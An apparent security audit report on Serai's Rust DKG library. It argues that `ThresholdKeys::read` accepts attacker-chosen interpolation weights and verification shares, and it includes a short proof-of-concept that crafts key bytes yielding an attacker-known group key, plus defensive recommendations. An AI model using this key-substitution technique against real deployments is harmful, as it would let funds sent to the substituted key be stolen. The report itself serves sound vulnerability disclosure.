### Title
Attacker-controlled variant byte and parameters in `ThresholdKeys::read` hijack the interpolation "function" and key derivation, producing signatures under an attacker-defined group key - ([File: crypto/dkg/src/lib.rs])

### Summary
The reported bug class is a deserializer that lets untrusted input select and invoke functionality it should never reach (a `Function` object restored via `pureServerFunction`). Serai's structural analog is `ThresholdKeys::<C>::read`, whose serialized format encodes not just data but *behavior*: a variant byte selects which interpolation algorithm the keys will use at signing time (`Interpolation::Constant` vs `Interpolation::Lagrange`), and the remainder of the stream supplies the participant index, threshold parameters, the interpolation coefficients themselves, the secret share, and every verification share. Feeding crafted bytes to `ThresholdKeys::read` therefore installs an attacker-authored "function" (the weight vector used by `interpolation_factor`) plus attacker-chosen verification shares, which `ThresholdKeys::new` turns into the validator's group key and signing semantics — all without any proof that the deserialized object was produced by an actual DKG.

### Finding Description
`ThresholdKeys::read` reads a type tag and dispatches on it, then feeds fully attacker-controlled material into `ThresholdKeys::new`:

```rust
let mut interpolation = [0];
reader.read_exact(&mut interpolation)?;
let interpolation = match interpolation[0] {
  0 => Interpolation::Constant({ ... n attacker-chosen scalars ... }),
  1 => Interpolation::Lagrange,
  _ => Err(...)?,
};
let secret_share = Zeroizing::new(C::read_F(reader)?);
let mut verification_shares = HashMap::new();
for l in (1 ..= n).map(Participant) {
  verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
}
ThresholdKeys::new(ThresholdParams::new(t, n, i)?, interpolation, secret_share, verification_shares)
``` [1](#0-0) 

`ThresholdKeys::new` then computes the group key directly from these attacker-chosen inputs:

```rust
let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
let group_key =
  t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
``` [2](#0-1) 

The only semantic check is that `t == n` for `Constant` interpolation [3](#0-2) . Nothing verifies that the claimed `secret_share` corresponds to `verification_shares[i]`, that the shares lie on a threshold polynomial, or that the key was honestly generated — the deserializer reconstructs the full "program" (which interpolation to run, with which weights, over which shares) from untrusted bytes, exactly mirroring the advisory's deserializer-reachable-function pattern.

`Interpolation::Constant` is used by the MuSig n-of-n construction with binding factors as weights [4](#0-3) , so the `Constant` path is legitimate functionality — but the *deserializer* lets an unauthenticated byte stream invoke it with arbitrary coefficients and arbitrary verification shares, which is the injected behavior.

### Impact Explanation
A party who can deliver serialized `ThresholdKeys` bytes (the task scope explicitly covers untrusted bytes fed to `ThresholdKeys::read`) causes the victim to instantiate a "threshold key" whose:

- **group key is attacker-known**: choose `Constant` weights `c_i = 1` and `verification_shares[l] = G * y_l` for known `y_l`, giving `group_key = G * Σy_i` — a key the attacker can unilaterally sign for. Any funds the system directs to this group key (deposits routed to the validator address) are immediately stealable by the attacker, while the victim believes it holds a distributed share.
- **share consistency is fabricated or broken at will**: the attacker can make `secret_share` inconsistent with `verification_shares[i]`, causing the victim's signature shares to fail `verify_share` and be blamed in `AlgorithmSignatureMachine::complete` [5](#0-4) , or produce internally consistent keys that sign under a group key never produced by the DKG.

Both accepted impact classes apply: funds reported received (against the deserialized group key) that are not spendable by Serai, and signing behavior dictated by attacker-supplied bytes rather than by protocol state.

### Likelihood Explanation
**Medium / conditional.** Exploitation requires attacker-controlled bytes to reach `ThresholdKeys::read` — e.g., key material restored or synced from an untrusted source rather than produced by the local DKG path (`key_gen`, `PedPoP`, `musig` all construct `ThresholdKeys` in memory and never round-trip through `read` [6](#0-5) ). Where such a restore/import path exists, no authentication tag, MAC, or provenance check on the key blob prevents the swap, and the `Constant`-vs-`Lagrange` tag plus weight vector give the attacker a wide, fully valid input space. It requires no malformed encodings — every scalar and point is canonical — so no deserialization error is raised. Severity is bounded below Critical because the attacker cannot recover an *honest* secret share this way; they substitute a key they already control.

### Recommendation
- Do not deserialize `Interpolation::Constant` from untrusted bytes, or cryptographically bind the interpolation choice and coefficients to the DKG context: serialize `ThresholdKeys` under an authenticated construct (e.g., include the PedPoP/MuSig `context` hash and require it to match the expected session context on `read`).
- In `ThresholdKeys::new`, verify `verification_shares[i] == C::generator() * secret_share` for the local participant so an inconsistent share/verification pair cannot be instantiated.
- Reject `Interpolation::Constant` on `read` unless the caller explicitly requests MuSig-formatted keys, preventing silent algorithm substitution via the tag byte.

### Proof of Concept
```rust
use ciphersuite::Ciphersuite;
use dkg::{ThresholdKeys, Participant, ThresholdParams, Interpolation};
use zeroize::Zeroizing;
use rand_core::OsRng;

// For any Ciphersuite C, craft bytes selecting Interpolation::Constant (tag 0)
// with n = t, weights all 1, and verification shares with known discrete logs.

fn craft_keys<C: Ciphersuite>() -> Vec<u8> {
    let n: u16 = 2;
    let y1 = C::random_nonzero_F(&mut OsRng); // attacker-known
    let y2 = C::random_nonzero_F(&mut OsRng); // attacker-known
    // attacker knows DL of group_key = y1 + y2

    let mut buf = vec![];
    // curve ID header
    buf.extend((C::ID.len() as u32).to_le_bytes());
    buf.extend(C::ID);
    buf.extend(n.to_le_bytes());            // t = 2
    buf.extend(n.to_le_bytes());            // n = 2
    buf.extend(1u16.to_le_bytes());         // i = 1
    buf.push(0);                            // <-- injected "function": Interpolation::Constant
    for _ in 0 .. n {
        buf.extend(C::F::ONE.to_repr().as_ref()); // attacker-chosen weights
    }
    buf.extend(y1.to_repr().as_ref());      // secret_share (attacker-chosen)
    buf.extend((C::generator() * y1).to_bytes().as_ref()); // verification_shares[1]
    buf.extend((C::generator() * y2).to_bytes().as_ref()); // verification_shares[2]
    buf
}

// ThresholdKeys::<C>::read(&mut craft_keys::<C>().as_slice()) succeeds and yields a key
// whose group_key() == C::generator() * (y1 + y2) — fully known to the attacker.
// Any deposit routed to this "validator" group key is immediately spendable by the attacker,
// and the victim's signing semantics were selected by byte 0x00 of untrusted input.
```

The acceptance hinges on the existence of a reachable `ThresholdKeys::read` call on attacker-influenced bytes; within this repo I confirmed the deserialization path itself performs no provenance or consistency check beyond `t == n` for `Constant` [7](#0-6) .

### Citations

**File:** crypto/dkg/src/lib.rs (L347-391)
```rust
impl<C: Ciphersuite> ThresholdKeys<C> {
  /// Create a new set of ThresholdKeys.
  pub fn new(
    params: ThresholdParams,
    interpolation: Interpolation<C::F>,
    secret_share: Zeroizing<C::F>,
    verification_shares: HashMap<Participant, C::G>,
  ) -> Result<ThresholdKeys<C>, DkgError> {
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }

    match &interpolation {
      Interpolation::Constant(_) => {
        if params.t() != params.n() {
          Err(DkgError::InapplicableInterpolation("constant interpolation for keys where t != n"))?;
        }
      }
      Interpolation::Lagrange => {}
    }

    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

    Ok(ThresholdKeys {
      core: Arc::new(Zeroizing::new(ThresholdCore {
        params,
        interpolation,
        secret_share,
        group_key,
        verification_shares,
      })),
      scalar: C::F::ONE,
      offset: C::F::ZERO,
    })
  }
```

**File:** crypto/dkg/src/lib.rs (L604-631)
```rust
    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```

**File:** crypto/dkg/musig/src/lib.rs (L155-161)
```rust
  ThresholdKeys::new(
    params,
    Interpolation::Constant(binding_factors),
    private_key,
    verification_shares,
  )
  .map_err(MusigError::DkgError)
```

**File:** crypto/frost/src/sign.rs (L475-494)
```rust
    for l in self.view.included() {
      if let Ok(statements) = self.params.algorithm.verify_share(
        self.view.verification_share(*l),
        &self.B.bound(*l),
        responses[l],
      ) {
        batch.queue(&mut rng, *l, statements);
      } else {
        Err(FrostError::InvalidShare(*l))?;
      }
    }

    if let Err(l) = batch.verify_vartime_with_vartime_blame() {
      Err(FrostError::InvalidShare(l))?;
    }

    // If everyone has a valid share, and there were enough participants, this should've worked
    // The only known way to cause this, for valid parameters/algorithms, is to deserialize a
    // semantically invalid FrostKeys
    Err(FrostError::InternalError("everyone had a valid share yet the signature was still invalid"))
```
